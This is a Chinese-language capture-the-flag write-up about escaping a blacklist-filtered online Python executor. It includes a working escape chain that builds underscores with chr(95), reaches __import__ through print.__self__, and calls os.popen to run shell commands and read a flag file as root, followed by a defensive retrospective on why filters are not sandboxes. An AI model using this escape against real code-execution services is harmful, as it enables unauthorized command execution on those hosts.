## 题目原文

> 一个在线Python代码编辑器，支持实时执行代码。开发者声称已经实现了完善的安全过滤机制。真的是这样吗？

## 题解

### 入口与指纹

`Werkzeug/3.1.8` + `Python/3.11.15`（开发服务器），页面 `CodeRunner - Online Python Editor`。

前端只有一个接口：

```js
fetch('/api/execute', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ code: code })
})
```

返回 `{"output":..., "success":true}` 或 `{"error":"Blocked ...","success":false}`。

### 关键观察

**1. 过滤只做「字符黑名单 + 关键字黑名单」，不是沙箱。**

逐个探测后的结论：

| 类型 | 被拦 |
| --- | --- |
| 字符 | `_`、`[`、`]` |
| 关键字 | `import`、`open`、`eval`、`exec`、`compile`、`input` |

其余全部放行：`(`、`)`、`.`、`'`、`"`、`+`、`*`、`=`、`,`、`:`、`{}`、`/`、`\`、`%`、`@`、`#`、`$`、`&`、`|`、`!`、`<`、`>`、`;`、`-`、空格。

而且 `getattr`、`globals`、`vars`、`dir`、`breakpoint`、`help` 都还能直接 `print` 出来（返回 `<built-in function ...>`），说明**没有裁剪 `__builtins__`**。

**2. 黑名单是「字符串包含」，可以拆字绕过。**

`import` 被拦，但把它拆成 `"im"+"port"` 拼出来的字符串不含连续子串 `import`，过滤就放过了。`open` 同理拆成 `"pop"+"en"`。`_` 被拦，但 `chr(95)` 就是下划线。

**3. `print` 这个内建函数本身就是跳到 `builtins` 模块的支点。**

`print.__self__` 是 `builtins` 模块（`<module 'builtins' (built-in)>`），从它 `getattr` 出 `__import__` 即可。

### 利用链

**Step 1：确认过滤边界。**

```python
print(1+1)                # 2
print(getattr)            # <built-in function getattr>
print(globals)            # <built-in function globals>
import os                 # Blocked keyword detected: import
print(().__class__)       # Blocked character detected: _
```

**Step 2：用 `chr(95)` 拼下划线，用 `print.__self__` 找 builtins。**

```python
u = chr(95)
mod = getattr(print, u*2 + "self" + u*2)          # builtins 模块
imp = getattr(mod, u*2 + "im" + "port" + u*2)     # __import__
os  = imp("os")
p   = getattr(os, "pop" + "en")                   # os.popen
print(p("id; cat /challenge/flag.txt").read())
```

输出：

```
uid=0(root) gid=0(root) groups=0(root)
flag{8dbe5e59-711d-4006-89c4-47f49b3cc1a8}
```

**注意**：`globals()` 返回的 dict 里有 `__builtins__` 这个 **key**，但 `getattr(dict, "__builtins__")` 找的是**属性**，会抛 `AttributeError`。dict 的 key 要用 `.get()` 取；要拿模块级 builtins 用 `print.__self__` 更直接。

### 复盘

- **过滤的是字符不是语义。** 禁 `_` 但不禁 `chr`，禁 `import` 但不禁字符串拼接，禁 `[` 但不禁 `.get()`——任何一条没堵住就够逃逸。
- **`__builtins__` 没被裁剪就等于没有沙箱。** 判断沙箱强弱先看 `print(getattr)` 之类的内建函数是否还在；还在就能顺着 `__self__` / `__class__` / `__subclasses__` 走到 `os`。
- **`print.__self__` 是个好支点。** 不需要 `globals()['__builtins__']`（那还需要 `[` 和 `_`），一个内建函数的 `__self__` 直接就是 builtins 模块。
- **`dict` 的 key 不是属性。** `getattr(d, '__builtins__')` 失败不代表 key 不存在，用 `.get()`。
- 执行身份是 `root`，说明题目只在前置过滤上设防，没有做进程级隔离（没有降权、没有 seccomp、没有容器边界）。
